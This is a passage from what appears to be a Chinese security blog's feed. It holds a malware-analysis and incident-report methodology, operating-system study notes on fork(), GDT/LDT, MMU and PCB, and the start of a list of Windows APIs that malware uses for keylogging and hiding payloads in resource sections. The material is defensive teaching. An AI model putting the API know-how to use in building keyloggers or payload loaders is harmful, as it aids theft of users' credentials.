<h2 id="一、关于导入函数"><a href="#一、关于导入函数" class="headerlink" title="一、关于导入函数"></a>一、关于导入函数</h2><p>这里要仔细看看<code>WinAPI总结</code>，里面会把学习过程中用到的常见API进行总结，包括该函数的类别与具体功能、参数。</p>
<p>在具体分析过程中不需要记住这些api的实现细节，而是要分门别类的记忆这些API的作用，也就是说当看到某一个或者某一类敏感API时能够大体推测出其在整个恶意代码攻击流程中的哪一块。、</p>
<p>当<strong>打开一个恶意软件的导入表</strong>后，从以下几个方面进行分析：</p>
<ol>
<li><p><strong>文件方面的API</strong>：搜索<code>file</code>字符串</p>
<p>一般该类API都是使用在恶意代码的<strong>启动与持久化</strong>方面，比如将某些恶意载荷保存为一个已有文件或者修改原有文件实现特洛伊木马化。</p>
<p>具体API名字可以参见<code>WinAPI</code>总结。</p>
</li>
<li><p><strong>注册表方面的API</strong>：搜索<code>reg</code>字符串</p>
<p>一般该类API都是使用在<strong>启动和持久化</strong>方面，比如一些自启动目录、一些主动加载的DLL路径。</p>
<p>具体API名字可以参见<code>WinAPI</code>总结。</p>
</li>
<li><p><strong>进程方面的API</strong>：搜索<code>proc</code>、<code>module</code>或者<code>thread</code>字符串</p>
<p>一般该类API使用在进程注入、替换方面，特别是与一些内存申请、写入API结合。</p>
<p>具体API名字可以参见<code>WinAPI</code>总结。</p>
</li>
<li><p><strong>资源节方面的API</strong>：搜到<code>resource</code>字符串</p>
<p>一般该类API使用在恶意载荷的存储，后续通过这些API进行导出、执行。</p>
<p>具体API名字可以参见<code>WinAPI</code>总结。</p>
</li>
<li><p><strong>网络方面的API</strong>：</p>
<p>后续写</p>
</li>
<li><p><strong>反制措施方面的API</strong>：反沙箱、反虚拟机、反汇编、反调试。</p>
</li>
<li><p><strong>路径方面的API</strong>：搜索<code>get</code>字符串</p>
<p>这部分API一般与<strong>系统文件的修改</strong>有关。</p>
</li>
<li><p><strong>加密方面的API</strong>：搜索<code>key、crypt、Cert、CP</code>字符串</p>
<p>这部分API顾名思义，就是<strong>用于加密</strong>的，可能恶意软件会使用一些标准加密算法，就会<strong>导入一些常见的加密函数</strong>。</p>
</li>
<li><p><strong>核心行为方面的API</strong>：</p>
<p>这部分要与恶意软件分类结合，每一类恶意功能比如窃密、挖矿、勒索、后门等都会有一些常见的API，这也是识别特征之一。</p>
</li>
</ol>
<h2 id="二、关于字符串"><a href="#二、关于字符串" class="headerlink" title="二、关于字符串"></a>二、关于字符串</h2><p>当使用<code>string.exe</code>或者<code>ida</code>获取某<strong>恶意软件的字符串</strong>时，可以从以下几个方面进行猜测：</p>
<ol>
<li><strong>xxx.dll</strong>：包括一些<strong>知名的dll</strong>，比如kernel32、user32、ntdll这些，一般不用管；其次一些<strong>系统dll</strong>，比如psapi这些一般要关注其调用了哪些api；最后时一些<strong>自定义的dll</strong>,一般可以猜测是恶意载荷所在。</li>
<li><strong>目录、路径：</strong>包括一些注册表目录，一定要看看有哪些注册表操作，是不是自启动、该目录的作用是什么；其次一些系统目录比如system32、temp等，就要考虑是不是有对这些路径下文件的修改。</li>
<li><strong>函数名：</strong>在字符串里出现的函数名一般是使用<code>getprocaddress</code>调用的，动态加载。</li>
<li><strong>加解密相干的字符串</strong>：比如base64的索引集、一些加密算法使用的特征字符串，比如<code>SSL</code>。</li>
<li><strong>url、网络连接</strong>：候补。</li>
</ol>
<h1 id="基础动态分析"><a href="#基础动态分析" class="headerlink" title="基础动态分析"></a>基础动态分析</h1><blockquote>
<p>基础的动态分析一般是使用行为监控工具捕获该恶意文件的行为，包括<strong>文件操作、网络通信、注册表操作、进程操作</strong>等。</p>
</blockquote>
<p>推荐使用的工具包括：</p>
<ul>
<li><code>火绒剑、Procmon</code>：比较全面的过滤与监控工具</li>
<li><code>regshot</code>：注册表对比工具，可以更加细致的给出注册表的改变</li>
<li><code>wirshark</code>：网络监控工具，用于捕获与分析数据包</li>
<li><code>各类沙箱</code>：一般使用微步云沙箱、VT或者公司专用沙箱等</li>
</ul>
<p>在虚拟隔离环境下，运行恶意样本并进行恶意行为的监控与记录。</p>
<p>这一步是承上启下的一步，承接上一步基础静态分析推断的恶意功能，对其<strong>进行验证</strong>；同时为下一步具体的代码分析<strong>提供切入点</strong>。</p>
<p>一般恶意样本的代码都是比较复杂的，涉及的函数与调用关系很难一眼理清。所以，通过基础静态分析获取的<strong>关键API和字符串</strong>进行交叉引用，通过基础动态分析获取的恶意行为进行<strong>函数功能推测</strong>等，都可以帮助我们快速、高效的完成整个分析与处置过程。</p>
<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>这部分是整个分析过程的关键，也是耗费时间和精力最多的地方。</p>
<p>具体操作即通过IDA或者其他反汇编工具获取恶意样本的汇编代码与伪代码，进而分析上述恶意功能的具体代码实现。同时可以结合OD、x64dbg等调试器进行动态调试，获取实时运行结果。</p>
<p>具体的分析方法与技巧很多，这里不再赘述，只给出一个提醒：<strong>不要陷入繁琐的代码细节，要从宏观把握函数功能</strong>。</p>
<p>这一步的最终目的是从代码层次落实恶意功能，补充完善沙箱分析结果，为后续具体的样本处置提供依据。</p>
<h1 id="报告输出"><a href="#报告输出" class="headerlink" title="报告输出"></a>报告输出</h1><h2 id="概述："><a href="#概述：" class="headerlink" title="概述："></a><strong>概述</strong>：</h2><p>利用简短的一段话说清楚样本来源、判别结果、执行流程、具体恶意功能，一般是分析完毕后再写，帮助客户了解基本信息。</p>
<p><strong>给个示例</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">（样本来源）近日，XX同事工作主机疑似被植入恶意程序导致个人微信被攻击者控制滥用，（判别结果）经研判分析，确认工作主机被植入“游蛇”木马（又称银狐、谷堕）。（执行流程）该木马初始组件为虚假WPS安装包文件“wps一键安装 (<span class="number">1</span>).exe”，该组件运行后会在受害者主机中创建一个名为“八幺二八幺二”的已安装软件信息，该软件不具备可执行文件，且附带一个卸载程序。卸载程序执行后会删除不必要的木马文件、初始组件、个人文档视频图片等文件夹。（恶意功能）最终载荷为修改后的gh0st远控木马，通过创建计划任务进行持久化驻留。截至分析时，C2仍存活，但已失去控制功能（上线包无响应）。</span><br></pre></td></tr></table></figure>

<hr>
<p>下面分析过程<strong>以单一样本为例</strong>，如果样本存在文件释放、替换的功能，新的样本也可以按照如下步骤进行。</p>
<h2 id="样本标签："><a href="#样本标签：" class="headerlink" title="样本标签："></a>样本标签：</h2><p>给出该样本的基础信息，包括文件名、哈希值、处理器架构、文件大小、文件格式、时间戳、数字签名等，可以通过沙箱直接获取。</p>
<p><strong>给个示例：</strong></p>
<img src="http://image-blog-danggeovo.oss-cn-beijing.aliyuncs.com//imageimage-20231106105629720.png" alt="image-20231106105629720" style="zoom:33%;" />



<h2 id="基础静态分析-恶意功能推测"><a href="#基础静态分析-恶意功能推测" class="headerlink" title="基础静态分析-恶意功能推测"></a>基础静态分析-恶意功能推测</h2><p>见上部分，写报告注意给出具体解释，<strong>衔接好</strong>各个部分。</p>
<p>这里注意要<strong>描述下源文件的基础信息</strong>，比如文件名、文件类型、文件图标等，可以提供截图。因为很多恶意代码比如钓鱼邮件会进行混淆。</p>
<h2 id="基础动态分析–恶意功能监控"><a href="#基础动态分析–恶意功能监控" class="headerlink" title="基础动态分析–恶意功能监控"></a>基础动态分析–恶意功能监控</h2><p>见上部分，一定还要全面监控。</p>
<ul>
<li><strong>文件方面</strong>记录好文件<code>修改、替换、删除、移动、创建</code>情况，对于涉及的文件要进行具体分析。</li>
<li><strong>注册表方面</strong>注意<code>自启动项目</code>，一般会作为持久化操作的一项，提供执行后截图。</li>
<li><strong>网络方面</strong>记录好<code>请求情况</code>，包括目的ip、域名、协议类型、具体数据等</li>
<li><strong>进程方面</strong>记录好<code>进程树</code>，包括产生的子进程、运行的cmd，设置的定时任务等</li>
<li><strong>计划任务</strong>方面一定要注意，一般<code>挖矿</code>会设置定时访问矿池。</li>
</ul>
<p>这部分一般与<code>沙箱</code>结合，查缺补漏。同时与<code>威胁情报</code>结合，判别域名、IP的情况。</p>
<h2 id="源码分析—恶意功能落实"><a href="#源码分析—恶意功能落实" class="headerlink" title="源码分析—恶意功能落实"></a>源码分析—恶意功能落实</h2><p>从源码入手，选择<strong>初始函数或者导入表敏感函数</strong>为切入点，分析恶意功能的具体实现。</p>
<p>要<strong>熟悉恶意代码的攻击流程与实现手法</strong>，比如隐蔽启动的方式（线程注入、进程注入等）、持久化操作（注册表、服务、特洛伊木马化等）、核心载荷启动、恶意功能执行（挖矿、勒索、远控、感染等）</p>
<p>要学会<strong>画流程图</strong>，理清各个函数之间的调用关系，这很重要。</p>
<hr>
<p>上部分即为单样本分析流程，子文件可以参照分析。</p>
<h2 id="补充-ATT-CK体系"><a href="#补充-ATT-CK体系" class="headerlink" title="补充-ATT&amp;CK体系"></a>补充-ATT&amp;CK体系</h2><p>关于威胁框架的介绍可以看博客文章。ATT&amp;CK 攻击链。</p>
<p>通过ATTCK框架进行<strong>恶意代码行为映射</strong>，规范化报告的同时可以借鉴处置方法。</p>
<h2 id="样本处置"><a href="#样本处置" class="headerlink" title="样本处置"></a>样本处置</h2><p><strong>木马\病毒落地排查与清除</strong></p>
<p>再次列出<code>落地文件、注册表项目、计划任务、网络侧请求</code>等，并给出对应的处置措施。</p>
<p>文件要进行删除和恢复、进程要进行终止、注册表项和计划任务要进行清除、网络侧要进行ip封禁与防火墙策略配置。</p>
<p>通过<strong>日志审计</strong>等方式清理样本涉及的后渗透木马或工具。</p>
<p><strong>IOCs提取</strong></p>
<p>对于涉及到的文件哈希、IP地址、域名等进行统计记录，可以作为检测的一环。</p>
<p><strong>规则编写</strong></p>
<p>根据样本分析结果进行检测规则的编写，比如YARA规则、AVL规则等，可以进一步提高检测准确性。</p>
<p><strong>安全加固</strong></p>
<p>修复已知漏洞、加强员工意识培训、定期更换强密码等</p>
<blockquote>
<p><strong>写在最后</strong>：上述流程梳理只是针对恶意样本分析，后续会继续介绍流量行为分析流程。上述内容会不断改进。</p>
</blockquote>
]]></content>
      <categories>
        <category>【-专业知识-】恶意代码分析与处置</category>
        <category>分析方法论</category>
      </categories>
      <tags>
        <tag>恶意代码</tag>
        <tag>分析流程</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统--扩展知识</title>
    <url>/2022/08/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：在学习操作系统的过程中遇到一些<strong>不懂的地方</strong>，在本篇文章中<strong>按照章节</strong>进行整理记录。内容大多<strong>来自网络</strong>和<strong>自己的理解</strong>。</p>
</blockquote>
<h1 id="操作系统-多进程图谱"><a href="#操作系统-多进程图谱" class="headerlink" title="操作系统-多进程图谱"></a>操作系统-多进程图谱</h1><h2 id="fork-的流程与实现"><a href="#fork-的流程与实现" class="headerlink" title="fork()的流程与实现"></a>fork()的流程与实现</h2><blockquote>
<p>计算机通过<code>fork()</code>来<strong>创建进程</strong>，<strong>fork()<strong>的核心是<code>通过复制父进程来创建子进程</code>，换句话说，计算机中</strong>所有的进程</strong>都是通过<strong>继承</strong><code>0号进程和1号进程</code>而来的。所以这里我们先<strong>介绍这两个初始进程的建立.<strong>，而后再介绍fork()这个系统调用的</strong>实现流程</strong>。</p>
</blockquote>
<h4 id="从0号-1号进程的建立开始"><a href="#从0号-1号进程的建立开始" class="headerlink" title="从0号&#x2F;1号进程的建立开始"></a>从0号&#x2F;1号进程的建立开始</h4><blockquote>
<p>操作系统的<strong>第一个进程</strong>：<code>0号进程</code></p>
</blockquote>
<p>在最开始时，操作系统中是没有进程的，也就谈不上通过<code>fork()</code>进行建立。所以<code>0号进程</code>是通过<strong>手动设置进程信息</strong>来建立的，这些信息包括：<code>PCB</code>、<code>内核栈</code>、<code>用户栈</code>、<code>用户程序</code>等.</p>
<blockquote>
<blockquote>
<p>先来看一下<strong>PCB的初始化程序</strong>：</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660877078286.png"></p>
<p>其中，<code>task_struct</code> 是一个<strong>结构体</strong>，属于Linux定义的<strong>PCB数据结构</strong>。而后通过设置具体的值来<strong>初始化</strong>这个数据结构，包括：通过<code>LDT</code>设置进程使用的地址空间，通过这个表可以在执行程序时找到此进程的<strong>代码段进和数据段</strong>；<code>tss</code>可以完成<strong>PCB与内核栈</strong>的关联。</p>
<blockquote>
<blockquote>
<p>而后进行<strong>内核栈设置</strong></p>
</blockquote>
</blockquote>
<p><code>内核栈</code>是在<strong>中断进入内核</strong>时使用的，如果0号进程需要还要内核栈：根据tss中的信息将内核栈段寄存器<strong>SS设置为0x10</strong>，并将<strong>ESP设置为一个地址</strong>，这个地址根据进程初始化信息有所不同。</p>
<blockquote>
<blockquote>
<p>进行<strong>用户栈的设置</strong>与<strong>两栈之间的关联</strong></p>
</blockquote>
</blockquote>
<p><code>用户栈</code>的设置就是<strong>直接划分一段内存</strong>即可，而后将用户程序对应的<code>CS:IP</code>信息与用户站的<code>SS:SP</code>信息放到<strong>内核栈</strong>即可完成二栈关联，即<code>iret</code>后可以由内核程序返回到该进程的<strong>用户程序</strong>进行执行。</p>
<p>到这里，<strong>0号进程</strong>就已经<strong>建立起来</strong>了：其<code>PCB</code>中保存着此<strong>进程的信息</strong>，内核区域中有一部分区域用于其<strong>内核栈</strong>，用户区域也有一部分用于其<strong>用户栈</strong>，并且关于此进程的<strong>用户程序</strong>也被放到内存，这些程序的<strong>位置也被保存</strong>。</p>
<p>再之后就要执行0号进程的<strong>后续程序</strong>，也就是前面我们介绍操作系统启动的<strong>最后4句程序</strong>的后两句：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660878777271.png"></p>
<blockquote>
<p><strong>操作系统的第二个进程</strong>：<code>1号进程</code></p>
</blockquote>
<p>查看上图代码，<strong>0号进程</strong>会执行”<code>if (!fork() &#123; init();&#125; for(;;) pause();&#125;</code>“</p>
<p><strong>代码解释</strong>：<br><strong>0号进程</strong>会调用<code>fork()</code>创建<strong>1号进程</strong>，并且根据函数的返回值可以看出，1号进程会执行<code>init()函数</code>，而<strong>0号进程</strong>因为不满足if条件会执行后续的<code>pause()</code>从而通过此系统调用将<strong>自己暂停</strong>，为其他进程<strong>让出CPU</strong>。</p>
<p>而1<strong>号进程</strong>调用的<strong>init()<strong>函数会执行<code>execve()</code>系统调用，从而在1号进程的壳子里执行可执行程序”<code>/bin/sh</code>“,这就是</strong>shell程序</strong>，所以1号进程也被成为<strong>shell进程</strong>。</p>
<p><strong>shell进程</strong>的工作就是<strong>等待用户输入指令</strong>并<strong>通过fork()创建新的进程</strong>并<strong>使用exec()执行</strong>这个指令。</p>
<h4 id="fork-的原理和流程"><a href="#fork-的原理和流程" class="headerlink" title="fork()的原理和流程"></a>fork()的原理和流程</h4><p><code>[先看这个](https://cloud.tencent.com/developer/article/1396092)</code>，后面再具体整体与深入。</p>
<h2 id="GDT、LDT"><a href="#GDT、LDT" class="headerlink" title="GDT、LDT"></a>GDT、LDT</h2><blockquote>
<p>背景介绍：段寄存器</p>
</blockquote>
<p><strong>保护模式</strong>下的<strong>段寄存器</strong>由<code>16位的选择器</code>与<code>64位的段描述符寄存器</code>构成,前者可见。其结构如下图：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660788788428.png"></p>
<p>我们主要关注<strong>选择器</strong>，这个选择器类似<strong>保护模式下的段寄存器</strong>，通过其中的内容可以在<strong>段表中查询</strong>对应内容以完成<strong>地址翻译</strong>。<br>其中：16位选择子<code>前13位为索引号</code>也就是在段表中的位置；<code>第14位为0表示查询GDT表，为1表示查询LDT表</code>；<code>最后两位表示特权级</code>。</p>
<p>段寄存器的作用就是为了<strong>查询段表</strong>获取虚拟地址，下面我们就<strong>具体介绍一下这些段表</strong>：</p>
<blockquote>
<p><strong>全局描述符表GDT(Global Descriptor Tables)</strong></p>
</blockquote>
<p><code>GDT表</code>是一张操作系统层次的表，<strong>具有唯一性</strong>。它是许多<strong>描述符</strong>组成的一张描述符表，描述符就是用来<strong>描述一个段的信息</strong>，由8个字节组成(64bit),其中信息包括了段地址和偏移地址界限、特权级等一些信息。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660789273153.png"></p>
<p>如上图所示就是一个<strong>段描述符</strong>，其实也就是内存中的一段<strong>长度为64位</strong>的数字，不过这些数字<strong>根据位数不同</strong>表示代表不同含义，但是最终都可以分割成：<strong>段基址、段界限、类型、特权级等</strong>数据。</p>
<p>而其中的<strong>段基址就是指虚拟内存中某一段的基址</strong>，在<strong>加上偏移</strong>即可得到某一数据具体的<strong>虚拟地址</strong>。</p>
<p>同时，GDT的本质就是<strong>一段内存空间</strong>，其可以存储在任何位置，只要这个空间的基址被保存下来即可，这个<strong>保存GDT表基址</strong>的寄存器就是<code>GDTR寄存器</code>。</p>
<blockquote>
<p><strong>局部描述符表LDT(Local Decriptor Table)</strong></p>
</blockquote>
<p><code>LDT表</code>也是一种<strong>段表</strong>，不过与GDT表不同，LDT表<strong>不是唯一</strong>的，而是<strong>每一个进程都有一个对应的段表</strong>，用来存储此进程程序分段存储情况。</p>
<p>与GDT表类似，LDT表也是<strong>一段内存空间</strong>，所以要寻找到他需要知道<strong>其基址</strong>。不过不同的是，LDT表的基址是<strong>存储在GDT表</strong>中的，并且在<code>LDTR寄存器</code>中记录了当前进程LDT表在GDT表的<strong>索引</strong>。换句话说，通过<strong>修改LDTR中的内容即可获取到不同进程的LDT表</strong>。</p>
<p>在获取LDT表的基址后，就要根据段选择子的索引去获取具体段的基址。</p>
<p><strong>具体的示意图</strong>如下：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660790410590.png"></p>
<blockquote>
<p><strong>两个实例看两表</strong>:以<code>call 400</code>为例</p>
</blockquote>
<p>此程序需要<strong>访问400位置</strong>处的程序，但是这里的400只是<strong>偏移</strong>，要访问到具体的<strong>物理地址</strong>还要先进行<strong>地址翻译</strong>。</p>
<p>首先根据<strong>CS寄存器</strong>中的数据<strong>决定查表</strong>。如果<strong>TI&#x3D;0则要查GDT表</strong>，<strong>为1则要查LDT表</strong>。</p>
<blockquote>
<blockquote>
<p><strong>查询GDT表</strong></p>
</blockquote>
</blockquote>
<ol>
<li>根据GDTR寄存器中信息获取到GDT表的基址。</li>
<li>根据CS寄存器中前13位构成的索引号在GDT表中查询到对应的段描述符。</li>
<li>根据段描述符即可得到代码段的虚拟内存段基址，而后根据偏移400即可得到虚拟地址。</li>
<li>根据虚拟地址查询页表即可得到对应的页框并获取到其中存储的程序。</li>
</ol>
<blockquote>
<blockquote>
<p><strong>查询LDT表</strong></p>
</blockquote>
</blockquote>
<ol>
<li>根据LDTR寄存器中前13位组成的索引在GDT表中获取到段描述符，此描述符是LDT表的描述符。</li>
<li>根据段描述符定位到LDT表并通过CS寄存器获取到代码段的基址。</li>
<li>根据代码段基址和偏移得到虚拟地址并查询页表得到物理地址。</li>
</ol>
<p>如上例所示，查询LDT表比之查询GDT表<strong>多一个步骤</strong>，即<strong>通过GDT表获取到LDT表基址</strong>。</p>
<h2 id="MMU是什么"><a href="#MMU是什么" class="headerlink" title="MMU是什么"></a>MMU是什么</h2><blockquote>
<p>MMU是<code>Memory Management Unit</code>的缩写，中文名是<strong>内存管理单元</strong>，有时称作<strong>分页内存管理单元</strong>（英语：<code>paged memory management unit</code>，缩写为PMMU）。它是一种<strong>负责处理中央处理器（CPU）的内存访问请求</strong>的<strong>计算机硬件</strong>。它的功能包括<code>虚拟地址到物理地址的转换</code>（即虚拟内存管理）、<strong>内存保护</strong>、中央处理器<strong>高速缓存的控制</strong>，在较为简单的计算机体系结构中，负责<strong>总线的仲裁</strong>以及<strong>存储体切换</strong>（bank switching，尤其是在8位的系统上）。</p>
</blockquote>
<blockquote>
<p>为什么要介绍MMU</p>
</blockquote>
<p>因为在学习<strong>内存管理部分</strong>时涉及到了，不过当时的学习重点放在了<strong>原理层次</strong>，但是我对于实现地址翻译功能的<strong>硬件</strong>很感兴趣。于是在此进行扩展学习。</p>
<blockquote>
<p><strong>MMU的功能</strong></p>
</blockquote>
<blockquote>
<blockquote>
<p>1、将<strong>虚拟地址映射为物理地址</strong>。获取到虚拟地址后并不是直接送到总线的，而是经过MMU的转换。</p>
</blockquote>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1660741089252.png"></p>
<p>如上图所示，<code>MMU</code>是一个封装在CPU中的<strong>硬件</strong>，CPU每次执行<strong>访问内存的指令</strong>都会自动引发MMU做<strong>查表和地址转换</strong>操作，地址转换操作由<strong>硬件自动完成</strong>，不需要用指令控制MMU去做.</p>
<p>查表是指查询<strong>LDT表和页表</strong>，这两个表在正课学习中有介绍。</p>
<blockquote>
<blockquote>
<p>2、<strong>内存保护</strong>:在访问VA时进行<strong>特权级检查</strong></p>
</blockquote>
</blockquote>
<p>通过前面的学习，我们知道程序执行时是有<strong>特权级的</strong>，也就是<strong>CPL</strong>；而内存中的各个区域也是有<strong>特权级</strong>的，也就是<strong>DPL</strong>。同时在页表中也为每一个页<strong>设置了访问权限</strong>：<code>可读、可写、可执行</code>。</p>
<p>所以，当程序要<strong>访问内存时</strong>就要进行<strong>权限的检测</strong>，只有符合权限才可以进行访问操作。而这个<strong>检测权限的操作</strong>就是由<strong>MMU负责完成</strong>。</p>
<h2 id="PCB中有什么"><a href="#PCB中有什么" class="headerlink" title="PCB中有什么"></a>PCB中有什么</h2><blockquote>
<p>为了描述控制<strong>进程的运行</strong>，系统中存放进程的<strong>管理和控制信息</strong>的数据结构称为<code>进程控制块（PCB Process Control Block）</code>，它是<strong>进程实体</strong>的一部分，是操作系统中最重要的<strong>记录性数据结构</strong>。它是进程管理和控制的最重要的数据结构，<strong>每一个进程均有一个PCB</strong>，在创建进程时，建立PCB，伴随进程运行的全过程，直到进程撤消而撤消。</p>
</blockquote>
<p>PCB中记录了操作系统所需的，用于<strong>描述进程的当前情况</strong>以及<strong>控制进程运行</strong>的全部信息。PCB的作用是<code>使一个在多道程序环境下不能独立运行的程序（含数据），成为一个能独立运行的基本单位，一个能与其他进程并发执行的进程</code>。或者说，OS是根据PCB来对并发执行的进程进行控制和管理的。例如，当OS要调度某进程执行时，要从该进程的PCB中<strong>查处其现行状态及优先级</strong>；在调度到某进程后，要根据其PCB中所保存的<strong>处理机状态信息</strong>，设置该进程<strong>恢复运行的现场</strong>，并根据其PCB中的程序和数据的内存始址，<strong>找到其程序和数据</strong>；进程在执行过程中，当需要和与之合作的<strong>进程实现同步</strong>，<strong>通信或者访问文件</strong>时，也都需要访问PCB；当进程由于某种原因而暂停执行时，又须将器断点的<strong>处理机环境保存在PCB</strong>中。可见，在进程的整个生命期中，系统总是<strong>通过PCB对进程进行控制</strong>的，即系统是根据进程的PCB而不是任何别的什么而感知到该进程的存在的。所以说，<code>PCB是进程存在的唯一标志</code></p>
<p>一个进程由<code>PCB+进程程序+进程数据+进程工作区</code>组成，其中<strong>PCB无疑是最重要</strong>的。一个PCB一般由<strong>以下部分组成</strong>：</p>
<ol>
<li><code>程序ID（PID、进程句柄）</code>：它是唯一的，<strong>一个进程都必须对应一个PID</strong>。PID一般是<strong>整形数字</strong></li>
<li><code>特征信息</code>：一般分系统进程、用户进程、或者内核进程等</li>
<li><code>进程状态</code>：<strong>运行、就绪、阻塞</strong>，表示进程现的运行情况</li>
<li><code>优先级</code>：表示获得CPU控制权的<strong>优先级大小</strong></li>
<li><code>通信信息</code>：进程之间的<strong>通信关系</strong>的反映，由于操作系统会提供通信信道</li>
<li><code>现场保护区</code>：保护阻塞的进程</li>
<li><code>资源需求、分配控制信息</code></li>
<li><code>进程实体信息</code>，指明程序路径和名称，进程数据在物理内存还是在交换分区（分页）中</li>
<li><code>其他信息</code>：工作单位，工作区，文件信息等</li>
</ol>
<p>更多信息参考如下地址：</p>
<p><a href="https://baike.baidu.com/item/PCB/16067368#2">https://baike.baidu.com/item/PCB/16067368#2</a></p>
<p><a href="https://www.cnblogs.com/Lynn-Zhang/p/5589944.html">https://www.cnblogs.com/Lynn-Zhang/p/5589944.html</a></p>
]]></content>
      <categories>
        <category>【-基础知识-】408专题</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>恶意软件API汇总(更新ing)</title>
    <url>/2023/11/03/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6API%E6%B1%87%E6%80%BB(%E6%9B%B4%E6%96%B0ing)/</url>
    <content><![CDATA[<blockquote>
<p>该地会汇总笔者在学习恶意样本分析过程中遇到的<strong>知名API</strong>，其中包括书上介绍的、实践分析过程中遇到的，会以功能为标题进行整理。</p>
</blockquote>
<h1 id="恶意代码分析实战"><a href="#恶意代码分析实战" class="headerlink" title="恶意代码分析实战"></a>恶意代码分析实战</h1><h2 id="核心功能：窃密"><a href="#核心功能：窃密" class="headerlink" title="核心功能：窃密"></a>核心功能：窃密</h2><h3 id="击键记录"><a href="#击键记录" class="headerlink" title="击键记录"></a>击键记录</h3><blockquote>
<p><strong>位置</strong>：恶意代码分析实战-11章-击键记录</p>
<p><strong>功能</strong>：实现击键记录获取-登录凭证获取</p>
<p><strong>函数名</strong>：<code>SetWindowsHookEx</code>、<code>GetAsyncKeyState</code>和<code>GetForegroundWindow</code></p>
</blockquote>
<ol>
<li><p><code>SetWindowsHookEx</code>介绍：</p>
<p><strong>函数功能：</strong></p>
<p><code>SetWindowsHookEx</code> 函数用于安装一个钩子过程，以监视和拦截特定的事件或消息。它允许你拦截和处理全局的<strong>鼠标、键盘、消息</strong>和其他系统事件。</p>
<p><strong>函数格式</strong>：</p>
<p><strong>参数介绍</strong>：</p>
<ul>
<li><p>idHook（int）：指定要安装的<strong>钩子类型</strong>。它可以取以下值之一：</p>
<ul>
<li>WH_KEYBOARD：键盘钩子，用于监视键盘输入。</li>
<li>WH_MOUSE：鼠标钩子，用于监视鼠标输入。</li>
<li>WH_KEYBOARD_LL：低级键盘钩子，用于监视全局键盘输入。</li>
<li>WH_MOUSE_LL：低级鼠标钩子，用于监视全局鼠标输入。</li>
<li>其他钩子类型，可以根据需要选择。</li>
</ul>
</li>
<li><p>lpfn（HOOKPROC）：指向<strong>钩子过程</strong>的指针。钩子过程是一个回调函数，当特定事件发生时，系统会调用此函数。钩子过程的具体实现根据钩子类型而异。</p>
</li>
<li><p>hMod（HINSTANCE）：指定<strong>包含钩子过程的 DLL 的句柄</strong>。如果钩子过程位于当前进程的可执行文件中，可以传递 NULL。</p>
</li>
<li><p>dwThreadId（DWORD）：标识要安装钩子的线程的<strong>线程标识符</strong>。如果要安装一个全局钩子，可以将此参数设置为 0，并且钩子过程将在所有线程上调用。</p>
</li>
</ul>
<p><strong>返回值</strong>：</p>
<p>如果函数成功，返回值是一个钩子的句柄（HHOOK）。如果函数失败，返回值为 NULL。</p>
<p><strong>歌曰：</strong>安装钩子需要具有足够的权限，因此通常需要以管理员身份运行应用程序。</p>
<hr>
</li>
<li><p><code>GetAsyncKeyState</code>函数</p>
<p><strong>函数功能：</strong></p>
<p><code>GetAsyncKeyState</code> 函数用于<strong>检索指定虚拟键的状态</strong>（按下或释放）。它可以用于获取当前键盘上某个键的状态，无论该键是否与当前活动窗口相关。</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SHORT <span class="title function_">GetAsyncKeyState</span><span class="params">(</span></span><br><span class="line"><span class="params">  <span class="type">int</span> vKey</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong>：</p>
<ul>
<li><code>vKey</code>（int）：指定要<strong>检索状态的虚拟键码</strong>。可以使用预定义的虚拟键码（如 <code>VK_RETURN</code>、<code>VK_ESCAPE</code> 等）或自定义虚拟键码。</li>
</ul>
<p><strong>返回值：</strong></p>
<p>如果指定的虚拟键当前被按下，则返回值的最高位（MSB）被设置为1；如果指定的虚拟键当前未被按下，则返回值为0。对于返回值的其余位（除了最高位），它们是按下时返回的计数值，以指示键被按下的次数。</p>
</li>
<li><p><code>GetForegroundWindow</code>函数</p>
<p><strong>函数功能：</strong></p>
<p><code>GetForegroundWindow</code> 函数用于获取<strong>当前具有焦点的窗口的句柄</strong>。它返回当前活动窗口的句柄，即用户当前正在与之交互的窗口。</p>
<p><strong>函数格式：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HWND <span class="title function_">GetForegroundWindow</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p><strong>参数</strong>：</p>
<ul>
<li>无</li>
</ul>
<p><strong>返回值：</strong></p>
<p>返回值是当前具有焦点的窗口的句柄（HWND）。如果没有窗口具有焦点，返回值为 <code>NULL</code>。</p>
</li>
</ol>
<h2 id="资源节使用"><a href="#资源节使用" class="headerlink" title="资源节使用"></a>资源节使用</h2><blockquote>
<p><strong>位置</strong>：恶意代码分析实战-示例</p>
<p><strong>功能</strong>：资源节隐藏载荷，进行读取与载入</p>
<p><strong>函数</strong>：<code>FindResource、LoadResource、LockResource、SizeofResource、VirtualAlloc、FreeResource</code></p>
</blockquote>
<p>以下是关于这些函数的介绍：</p>
<ol>
